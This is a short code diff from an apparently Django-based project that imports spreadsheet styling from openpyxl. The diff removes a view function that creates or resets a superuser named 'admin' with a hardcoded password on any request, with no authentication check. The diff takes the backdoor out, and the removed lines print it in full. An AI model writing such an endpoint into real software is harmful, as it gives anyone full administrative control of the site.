@@ -20,30 +20,6 @@ from openpyxl.styles import (
     Border,
     Side
 )
-from django.contrib.auth.models import User
-from django.http import HttpResponse
-
-def create_admin(request):
-
-    user, created = User.objects.get_or_create(
-        username="admin",
-        defaults={
-            "email": "admin@gmail.com",
-            "is_staff": True,
-            "is_superuser": True,
-        }
-    )
-
-    user.set_password("123456Aa@")
-    user.is_staff = True
-    user.is_superuser = True
-    user.save()
-
-    return HttpResponse("PASSWORD RESET")
-
-    return HttpResponse(
-        "ADMIN CREATED"
-    )
 
 
 def dashboard(request):
